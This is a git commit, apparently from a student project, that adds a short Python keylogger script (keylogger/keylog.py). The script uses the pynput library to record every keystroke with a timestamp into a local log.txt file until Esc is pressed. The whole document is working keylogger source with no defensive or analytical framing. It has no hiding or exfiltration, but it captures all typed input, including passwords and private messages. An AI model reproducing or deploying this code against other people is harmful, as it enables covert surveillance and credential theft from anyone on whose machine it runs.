01d94caa6e482bc214395b05b7c89f9fe0d7e939
Menchit-ai <thomas.menchi@edu.esiee.fr>
2020-05-27 16:11:40 +0200

    keylloger

---
+++ keylogger/keylog.py
@@ -0,0 +1,24 @@
+import pynput
+from pynput.keyboard import Key, Listener
+import datetime
+
+def on_press(key):
+    write_file(str(key))
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+def write_file(key):
+    with open("log.txt",'a') as f:
+        f.write(str(datetime.datetime.now()))
+        f.write(" ")
+
+        key = key.replace("'","")
+        f.write(key)
+        f.write("\n")
+
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
